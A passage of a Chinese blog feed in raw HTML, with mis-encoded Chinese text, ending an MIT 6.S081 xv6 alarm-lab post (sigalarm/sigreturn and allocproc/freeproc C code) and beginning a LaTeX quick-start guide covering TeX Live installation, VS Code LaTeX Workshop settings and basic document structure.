class="code"><pre><code class="hljs c"><span class="hljs-comment">// defs.h</span><br><span class="hljs-function"><span class="hljs-keyword">int</span>             <span class="hljs-title">sigalarm</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">void</span> (*)())</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span>             <span class="hljs-title">sigreturn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br><span class="hljs-comment">//trap.c</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sigalarm</span><span class="hljs-params">(<span class="hljs-keyword">int</span> ticks, <span class="hljs-keyword">void</span> (*handler)())</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br>  p-&gt;alarm_interval=ticks;<br>  p-&gt;alarm_handler=handler;<br>  p-&gt;alarm_ticks=ticks;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sigreturn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br>  *p-&gt;trapframe = *p-&gt;saved_trapframe;<br>  p-&gt;alarm_flag = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>allocprocå‡½æ•°å’Œfreeprocå‡½æ•°ä¹Ÿéœ€è¦æ›´æ–°</p><ul><li>è¿›ç¨‹åˆ›å»ºå’Œé”€æ¯æ—¶ç»“æ„ä½“çš„å­—æ®µçš„è®¾ç½®</li></ul><p>å¯¹è¿›ç¨‹çš„å­—æ®µè¿›è¡Œåˆå§‹åŒ–å’Œé”€æ¯ä»¥åŠé¡µçš„ç”³è¯·</p><ul><li>ä½¿ç”¨kallocç»™p-&gt;saved_trapframeåˆ†é…ç©ºé—´</li><li>ä½¿ç”¨kfree((void *)p-&gt;saved_trapframe);é”€æ¯ç©ºé—´</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Look in the process table for an UNUSED proc.</span><br><span class="hljs-comment">// If found, initialize state required to run in the kernel,</span><br><span class="hljs-comment">// and return with p-&gt;lock held.</span><br><span class="hljs-comment">// If there are no free procs, or a memory allocation fails, return 0.</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> struct proc*</span><br><span class="hljs-function"><span class="hljs-title">allocproc</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>;</span><br><br>  <span class="hljs-keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;<br>    acquire(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">if</span>(p-&gt;state == UNUSED) &#123;<br>      <span class="hljs-keyword">goto</span> found;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      release(&amp;p-&gt;lock);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>found:<br>  p-&gt;pid = allocpid();<br><br>  <span class="hljs-comment">// Allocate a trapframe page.</span><br>  <span class="hljs-keyword">if</span>((p-&gt;trapframe = (struct trapframe *)kalloc()) == <span class="hljs-number">0</span>)&#123;<br>    release(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// An empty user page table.</span><br>  p-&gt;pagetable = proc_pagetable(p);<br>  <span class="hljs-keyword">if</span>(p-&gt;pagetable == <span class="hljs-number">0</span>)&#123;<br>    freeproc(p);<br>    release(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>   <span class="hljs-comment">//</span><br>  <span class="hljs-keyword">if</span>((p-&gt;saved_trapframe = (struct trapframe *)kalloc()) == <span class="hljs-number">0</span>)&#123;<br>    freeproc(p);<br>    release(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-comment">// Set up new context to start executing at forkret,</span><br>  <span class="hljs-comment">// which returns to user space.</span><br>  <span class="hljs-built_in">memset</span>(&amp;p-&gt;context, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(p-&gt;context));<br>  p-&gt;context.ra = (uint64)forkret;<br>  p-&gt;context.sp = p-&gt;kstack + PGSIZE;<br><br>  p-&gt;alarm_flag=<span class="hljs-number">0</span>;<span class="hljs-comment">//</span><br>  p-&gt;alarm_interval = <span class="hljs-number">0</span>;<br>  p-&gt;alarm_handler = <span class="hljs-number">0</span>;<br>  p-&gt;alarm_ticks = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">return</span> p;<br>&#125;<br><br><span class="hljs-comment">// free a proc structure and the data hanging from it,</span><br><span class="hljs-comment">// including user pages.</span><br><span class="hljs-comment">// p-&gt;lock must be held.</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">freeproc</span><span class="hljs-params">(struct proc *p)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>(p-&gt;trapframe)<br>    kfree((<span class="hljs-keyword">void</span>*)p-&gt;trapframe);<br>  p-&gt;trapframe = <span class="hljs-number">0</span>;<br>    <br>  <span class="hljs-keyword">if</span>(p-&gt;pagetable)<br>    proc_freepagetable(p-&gt;pagetable, p-&gt;sz);<br>  <br>  <span class="hljs-keyword">if</span>(p-&gt;saved_trapframe)<br>    kfree((<span class="hljs-keyword">void</span> *)p-&gt;saved_trapframe);<br>    <br>  p-&gt;pagetable = <span class="hljs-number">0</span>;<br>  p-&gt;sz = <span class="hljs-number">0</span>;<br>  p-&gt;pid = <span class="hljs-number">0</span>;<br>  p-&gt;parent = <span class="hljs-number">0</span>;<br>  p-&gt;name[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  p-&gt;chan = <span class="hljs-number">0</span>;<br>  p-&gt;killed = <span class="hljs-number">0</span>;<br>  p-&gt;xstate = <span class="hljs-number">0</span>;<br>  p-&gt;state = UNUSED;<br>  <br>  p-&gt;alarm_flag=<span class="hljs-number">0</span>;<span class="hljs-comment">//</span><br>  p-&gt;alarm_interval = <span class="hljs-number">0</span>;<br>  p-&gt;alarm_handler = <span class="hljs-number">0</span>;<br>  p-&gt;alarm_ticks = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯„åˆ†</p><p><img src="https://img.gls.show/img/b48525193508d98e10d9e31c3878fbf3.png"></p>]]></content>
    
    
    <categories>
      
      <category>MIT6S081</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>LaTeXå¿«é€Ÿå…¥é—¨</title>
    <link href="/p/cc09e53b/"/>
    <url>/p/cc09e53b/</url>
    
    <content type="html"><![CDATA[<p>LaTeXå¿«é€Ÿå…¥é—¨ï¼ŒåŒ…å«è½¯ä»¶å®‰è£…ã€ç¯å¢ƒé…ç½®ã€åŸºæœ¬ä½¿ç”¨æŠ€å·§</p><span id="more"></span><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><ul><li>åœ¨é•œåƒç½‘ç«™ä¸­ä¸‹è½½ISOæ–‡ä»¶ï¼Œæ¯”å¦‚<a href="https://mirrors.tuna.tsinghua.edu.cn/CTAN/systems/texlive/Images/">æ¸…åé•œåƒ</a>ï¼Œè¿™æ ·å¯ä»¥å¤§å¤§åŠ å¿«ä¸‹è½½é€Ÿåº¦</li><li>å³é”®ISOæ–‡ä»¶ï¼Œæ‰¾åˆ°æ‰“å¼€æ–¹å¼ï¼Œé€‰æ‹©æ–‡ä»¶èµ„æºç®¡ç†å™¨æ‰“å¼€</li><li>ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œ<strong>install-tl-windows.bat</strong></li><li>æ­¤æ—¶ä¼šå¼¹å‡ºtex live installerçš„ç•Œé¢ï¼Œç‚¹å‡»å®‰è£…å³å¯ã€‚æˆ‘è¿™é‡ŒäºŒååˆ†é’Ÿå®‰è£…å®Œæˆ</li></ul><p>æ‰“å¼€cmdï¼Œåœ¨å…¶ä¸­è¾“å…¥xelatex -v ï¼Œè‹¥æ‰“å°å‡ºç›¸å…³ä¿¡æ¯ï¼Œè¿™è¯´æ˜å·²ç»å®‰è£…å®Œæˆ</p><p>æœ‰è®¸å¤šç¼–è¾‘å™¨å¯ä»¥å†™texï¼Œè¿™é‡Œæ˜¯ä¸€äº›ä¸»æµ$\LaTeX$ ç¼–è¾‘å™¨</p><ul><li><p>overleafï¼Œä¸€ä¸ªåœ¨çº¿çš„ã€ç½‘é¡µç«¯çš„LaTeXç¼–è¾‘å™¨</p><ul><li>å·²è¢«å¢™</li><li>å¯ä»¥ä½¿ç”¨è°·æ­Œè´¦å·ç™»å½•</li></ul></li><li><p>TeXstudio</p><ul><li>å¼€æºçš„ã€è·¨å¹³å°çš„é›†æˆå¼€å‘ç¯å¢ƒï¼Œç”±Qtç¼–å†™</li></ul></li><li><p>vscode</p><ul><li>vscode osï¼Œä¸ç”¨å¤šè¯´</li></ul></li></ul><p>æˆ‘è¿™é‡Œä½¿ç”¨äº†vscodeï¼Œä¸‹é¢æ˜¯å¯¹åº”çš„é…ç½®ï¼š</p><p>ä¸‹è½½LaTeX workshopæ’ä»¶ï¼Œç„¶åç¼–è¾‘vscodeçš„setting.jsonæ–‡ä»¶ï¼Œåœ¨å…¶ä¸­åŠ å…¥ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-string">&quot;latex-workshop.latex.autoBuild.run&quot;</span>: <span class="hljs-string">&quot;never&quot;</span>,<br>    <span class="hljs-string">&quot;latex-workshop.showContextMenu&quot;</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&quot;latex-workshop.intellisense.package.enabled&quot;</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&quot;latex-workshop.message.error.show&quot;</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-string">&quot;latex-workshop.message.warning.show&quot;</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-string">&quot;latex-workshop.latex.tools&quot;</span>: [<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;xelatex&quot;</span>,<br>            <span class="hljs-attr">&quot;command&quot;</span>: <span class="hljs-string">&quot;xelatex&quot;</span>,<br>            <span class="hljs-attr">&quot;args&quot;</span>: [<br>                <span class="hljs-string">&quot;-synctex=1&quot;</span>,<br>                <span class="hljs-string">&quot;-interaction=nonstopmode&quot;</span>,<br>                <span class="hljs-string">&quot;-file-line-error&quot;</span>,<br>                <span class="hljs-string">&quot;%DOCFILE%&quot;</span><br>            ]<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;pdflatex&quot;</span>,<br>            <span class="hljs-attr">&quot;command&quot;</span>: <span class="hljs-string">&quot;pdflatex&quot;</span>,<br>            <span class="hljs-attr">&quot;args&quot;</span>: [<br>                <span class="hljs-string">&quot;-synctex=1&quot;</span>,<br>                <span class="hljs-string">&quot;-interaction=nonstopmode&quot;</span>,<br>                <span class="hljs-string">&quot;-file-line-error&quot;</span>,<br>                <span class="hljs-string">&quot;%DOCFILE%&quot;</span><br>            ]<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;latexmk&quot;</span>,<br>            <span class="hljs-attr">&quot;command&quot;</span>: <span class="hljs-string">&quot;latexmk&quot;</span>,<br>            <span class="hljs-attr">&quot;args&quot;</span>: [<br>                <span class="hljs-string">&quot;-synctex=1&quot;</span>,<br>                <span class="hljs-string">&quot;-interaction=nonstopmode&quot;</span>,<br>                <span class="hljs-string">&quot;-file-line-error&quot;</span>,<br>                <span class="hljs-string">&quot;-pdf&quot;</span>,<br>                <span class="hljs-string">&quot;-outdir=%OUTDIR%&quot;</span>,<br>                <span class="hljs-string">&quot;%DOCFILE%&quot;</span><br>            ]<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;bibtex&quot;</span>,<br>            <span class="hljs-attr">&quot;command&quot;</span>: <span class="hljs-string">&quot;bibtex&quot;</span>,<br>            <span class="hljs-attr">&quot;args&quot;</span>: [<br>                <span class="hljs-string">&quot;%DOCFILE%&quot;</span><br>            ]<br>        &#125;<br>    ],<br>    <span class="hljs-string">&quot;latex-workshop.latex.recipes&quot;</span>: [<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;XeLaTeX&quot;</span>,<br>            <span class="hljs-attr">&quot;tools&quot;</span>: [<br>                <span class="hljs-string">&quot;xelatex&quot;</span><br>            ]<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;PDFLaTeX&quot;</span>,<br>            <span class="hljs-attr">&quot;tools&quot;</span>: [<br>                <span class="hljs-string">&quot;pdflatex&quot;</span><br>            ]<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;BibTeX&quot;</span>,<br>            <span class="hljs-attr">&quot;tools&quot;</span>: [<br>                <span class="hljs-string">&quot;bibtex&quot;</span><br>            ]<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;LaTeXmk&quot;</span>,<br>            <span class="hljs-attr">&quot;tools&quot;</span>: [<br>                <span class="hljs-string">&quot;latexmk&quot;</span><br>            ]<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;xelatex -&gt; bibtex -&gt; xelatex*2&quot;</span>,<br>            <span class="hljs-attr">&quot;tools&quot;</span>: [<br>                <span class="hljs-string">&quot;xelatex&quot;</span>,<br>                <span class="hljs-string">&quot;bibtex&quot;</span>,<br>                <span class="hljs-string">&quot;xelatex&quot;</span>,<br>                <span class="hljs-string">&quot;xelatex&quot;</span><br>            ]<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;pdflatex -&gt; bibtex -&gt; pdflatex*2&quot;</span>,<br>            <span class="hljs-attr">&quot;tools&quot;</span>: [<br>                <span class="hljs-string">&quot;pdflatex&quot;</span>,<br>                <span class="hljs-string">&quot;bibtex&quot;</span>,<br>                <span class="hljs-string">&quot;pdflatex&quot;</span>,<br>                <span class="hljs-string">&quot;pdflatex&quot;</span><br>            ]<br>        &#125;,<br>    ],<br>    <span class="hljs-string">&quot;latex-workshop.latex.clean.fileTypes&quot;</span>: [<br>        <span class="hljs-string">&quot;*.aux&quot;</span>,<br>        <span class="hljs-string">&quot;*.bbl&quot;</span>,<br>        <span class="hljs-string">&quot;*.blg&quot;</span>,<br>        <span class="hljs-string">&quot;*.idx&quot;</span>,<br>        <span class="hljs-string">&quot;*.ind&quot;</span>,<br>        <span class="hljs-string">&quot;*.lof&quot;</span>,<br>        <span class="hljs-string">&quot;*.lot&quot;</span>,<br>        <span class="hljs-string">&quot;*.out&quot;</span>,<br>        <span class="hljs-string">&quot;*.toc&quot;</span>,<br>        <span class="hljs-string">&quot;*.acn&quot;</span>,<br>        <span class="hljs-string">&quot;*.acr&quot;</span>,<br>        <span class="hljs-string">&quot;*.alg&quot;</span>,<br>        <span class="hljs-string">&quot;*.glg&quot;</span>,<br>        <span class="hljs-string">&quot;*.glo&quot;</span>,<br>        <span class="hljs-string">&quot;*.gls&quot;</span>,<br>        <span class="hljs-string">&quot;*.ist&quot;</span>,<br>        <span class="hljs-string">&quot;*.fls&quot;</span>,<br>        <span class="hljs-string">&quot;*.log&quot;</span>,<br>        <span class="hljs-string">&quot;*.fdb_latexmk&quot;</span><br>    ],<br>    <span class="hljs-string">&quot;latex-workshop.latex.autoClean.run&quot;</span>: <span class="hljs-string">&quot;onFailed&quot;</span>,<br>    <span class="hljs-string">&quot;latex-workshop.latex.recipe.default&quot;</span>: <span class="hljs-string">&quot;lastUsed&quot;</span>,<br>    <span class="hljs-string">&quot;latex-workshop.view.pdf.internal.synctex.keybinding&quot;</span>: <span class="hljs-string">&quot;double-click&quot;</span><br></code></pre></td></tr></table></figure><p>ç„¶åvscodeå·¦è¾¹ä¼šå‡ºç°TEXçš„å›¾æ ‡ï¼Œå°±å¯ä»¥æ„‰å¿«çš„ç”¨vscodeå†™LaTeXäº†</p><h1 id="LaTeX-åŸºæœ¬æ¦‚å¿µ"><a href="#LaTeX-åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="LaTeX åŸºæœ¬æ¦‚å¿µ"></a>LaTeX åŸºæœ¬æ¦‚å¿µ</h1><ul><li>LaTeX è®¾è®¡åˆè¡·ï¼šåˆ†ç¦»å†…å®¹ä¸æ ¼å¼ï¼Œä»¥ä¾¿ä½œè€…èƒ½å¤Ÿä¸“æ³¨äºå†…å®¹åˆ›ä½œè€Œéç‰ˆå¼è®¾è®¡</li><li>å‘éŸ³ï¼šé›·æ³°èµ«</li><li>ä¼˜ç‚¹<ul><li>å¼ºå¤§çš„æ•°å­¦å…¬å¼æ’ç‰ˆèƒ½åŠ›</li><li>è·¨å¹³å°ã€å…è´¹ã€å¼€æº</li><li>å®¹æ˜“ç”Ÿæˆå¤æ‚çš„ä¸“ä¸šæ’ç‰ˆå…ƒç´ ï¼Œå¦‚<strong>è„šæ³¨ã€äº¤å‰å¼•ç”¨ã€å‚è€ƒæ–‡çŒ®ã€ç›®å½•</strong>ç­‰</li><li>å¯æ‰©å±•æ€§ï¼ˆé€šè¿‡å¼€å‘å®åŒ…ï¼‰</li></ul></li></ul><h1 id="LaTeX-åŸºæœ¬å‘½ä»¤"><a href="#LaTeX-åŸºæœ¬å‘½ä»¤" class="headerlink" title="LaTeX åŸºæœ¬å‘½ä»¤"></a>LaTeX åŸºæœ¬å‘½ä»¤</h1><h2 id=""><a href="#" class="headerlink" title="\"></a>\</h2><p>å‘½ä»¤ç”±åæ–œçº¿ <code>\</code>å¼€å¤´ï¼Œä¸”æ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼Œ\latexä¸è¢«è¯†åˆ«ï¼Œ\LaTeXè¢«è¯†åˆ«</p><h2 id="ä»£ç ç¤ºä¾‹"><a href="#ä»£ç ç¤ºä¾‹" class="headerlink" title="ä»£ç ç¤ºä¾‹"></a>ä»£ç ç¤ºä¾‹</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs latex">\begin&#123;âŸ¨environment nameâŸ©&#125;[âŸ¨optional argumentsâŸ©]&#123;âŸ¨mandatory argumentsâŸ©&#125;<br>â€¦<br>\end&#123;âŸ¨environment nameâŸ©&#125;<br></code></pre></td></tr></table></figure><ul><li>ç¯å¢ƒ(environment)ï¼šä»¤ä¸€äº›æ•ˆæœåœ¨å±€éƒ¨ç”Ÿæ•ˆï¼Œæˆ–æ˜¯ç”Ÿæˆç‰¹æ®Šçš„æ–‡æ¡£å…ƒç´ ã€‚ç¯å¢ƒçš„ç”¨æ³•æ˜¯ä¸€å¯¹å‘½ä»¤ \begin å’Œ \end</li><li> âŸ¨environment nameâŸ© ä¸ºç¯å¢ƒåï¼Œ\begin å’Œ \end ä¸­å¡«å†™çš„ç¯å¢ƒååº”å½“ç›¸åŒ</li><li>[âŸ¨optional argumentsâŸ©] ï¼šç¯å¢ƒæ‰€éœ€çš„å¯é€‰å‚æ•°</li><li>{âŸ¨mandatory argumentsâŸ©}ï¼šä¸ºç¯å¢ƒæ‰€éœ€çš„å¿…é€‰å‚æ•°</li></ul><h1 id="LATEX-æºä»£ç ç»“æ„"><a href="#LATEX-æºä»£ç ç»“æ„" class="headerlink" title="LATEX æºä»£ç ç»“æ„"></a>LATEX æºä»£ç ç»“æ„</h1><h2 id="document-class-ï¼ˆæ–‡æ¡£ç±»ï¼‰"><a href="#document-class-ï¼ˆæ–‡æ¡£ç±»ï¼‰" class="headerlink" title="document class ï¼ˆæ–‡æ¡£ç±»ï¼‰"></a>document class ï¼ˆæ–‡æ¡£ç±»ï¼‰</h2><p>LATEX æºä»£ç ä»¥ä¸€ä¸ª \documentclass å‘½ä»¤ä½œä¸ºå¼€å¤´ï¼Œå®ƒæŒ‡å®šäº†æ–‡æ¡£ä½¿ç”¨çš„æ–‡æ¡£ç±»</p><p>LATEX æºä»£ç çš„å¼€å¤´é¡»ç”¨\documentclass æŒ‡å®šæ–‡æ¡£ç±»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex">\documentclass[âŸ¨optionsâŸ©]&#123;âŸ¨class-nameâŸ©&#125;<br></code></pre></td></tr></table></figure><p>âŸ¨class-nameâŸ© ä¸ºæ–‡æ¡£ç±»çš„åç§°ï¼ŒåŒ…æ‹¬ï¼š</p><ul><li><p>article</p><ul><li>æ–‡ç« æ ¼å¼ï¼Œæ¯”å¦‚ç§‘æŠ€è®ºæ–‡ã€æŠ¥å‘Šã€è¯´æ˜æ–‡æ¡£ç­‰</li></ul></li><li><p>report</p><ul><li>é•¿ç¯‡æŠ¥å‘Šæ ¼å¼çš„æ–‡æ¡£ç±»ï¼Œå…·æœ‰ç« èŠ‚ç»“æ„ï¼Œç”¨äºç»¼è¿°ã€é•¿ç¯‡è®ºæ–‡ã€ç®€å•çš„ä¹¦ç±ç­‰</li></ul></li></ul><ul><li><p>book</p><ul><li>ä¹¦ç±æ–‡æ¡£ç±»ï¼ŒåŒ…å«ç« èŠ‚ç»“æ„å’Œå‰è¨€ã€æ­£æ–‡ã€åè®°ç­‰ç»“æ„</li></ul></li><li><p>proc</p></li><li><p>slides</p><ul><li>å¹»ç¯æ ¼å¼çš„æ–‡æ¡£ç±»</li></ul></li><li><p>minimal</p><ul><li> ä¸€ä¸ªæå…¶ç²¾ç®€çš„æ–‡æ¡£ç±»ï¼Œåªè®¾å®šäº†çº¸å¼ å¤§å°å’ŒåŸºæœ¬å­—å·ï¼Œç”¨ä½œä»£ç æµ‹è¯•çš„æœ€å°å·¥ä½œç¤ºä¾‹ï¼ˆMinimal Working Exampleï¼‰ã€‚</li></ul></li></ul><p>å¯é€‰å‚æ•° âŸ¨optionsâŸ© ä¸ºæ–‡æ¡£ç±»æŒ‡å®šé€‰é¡¹ï¼Œä»¥å…¨å±€åœ°è§„å®šä¸€äº›æ’ç‰ˆçš„å‚æ•°ï¼Œå¦‚å­—å·ã€çº¸å¼ å¤§å°ã€å•åŒé¢ç­‰ç­‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex">\documentclass[11pt,twoside,a4paper]&#123;article&#125;<br></code></pre></td></tr></table></figure><ul><li>æ–‡æ¡£ç±»ä¸ºarticle</li><li>æŒ‡å®šçº¸å¼ ä¸º A4 å¤§å°ï¼ŒåŸºæœ¬å­—å·ä¸º 11ptï¼ŒåŒé¢æ’ç‰ˆ</li></ul><h1 id="å¯¼è¨€åŒº"><a href="#å¯¼è¨€åŒº" class="headerlink" title="å¯¼è¨€åŒº"></a>å¯¼è¨€åŒº</h1><p>å¯¼è¨€åŒºä½äº \documentclass å‘½ä»¤ä¹‹åï¼Œä½œç”¨ä¸ºï¼š</p><ul><li><p>ä½¿ç”¨\usepackage å‘½ä»¤è°ƒç”¨å®åŒ…</p></li><li><p>è¿›è¡Œæ–‡æ¡£çš„å…¨å±€è®¾ç½®</p></li></ul><h2 id="å®åŒ…"><a href="#å®åŒ…" class="headerlink" title="å®åŒ…"></a>å®åŒ…</h2><p>å®åŒ…æ˜¯ä¸€äº›æ‰©å±•ï¼Œç”¨æ¥å¢å¼ºæˆ–è¡¥å…… LATEX çš„åŠŸèƒ½</p><p>ç¤ºä¾‹ï¼šä¸€æ¬¡æ€§è°ƒç”¨ä¸‰ä¸ªæ’ç‰ˆè¡¨æ ¼å¸¸ç”¨çš„å®åŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex">\usepackage&#123;tabularx, makecell, multirow&#125;<br></code></pre></td></tr></table></figure><h1 id="æ–‡å­—æ’ç‰ˆ"><a href="#æ–‡å­—æ’ç‰ˆ" class="headerlink" title="æ–‡å­—æ’ç‰ˆ"></a>æ–‡å­—æ’ç‰ˆ</h1><h2 id="å‡ ç§å¸¸è§ç¼–ç "><a href="#å‡ ç§å¸¸è§ç¼–ç " class="headerlink" title="å‡ ç§å¸¸è§ç¼–ç "></a>å‡ ç§å¸¸è§ç¼–ç </h2><ul><li>ASCII 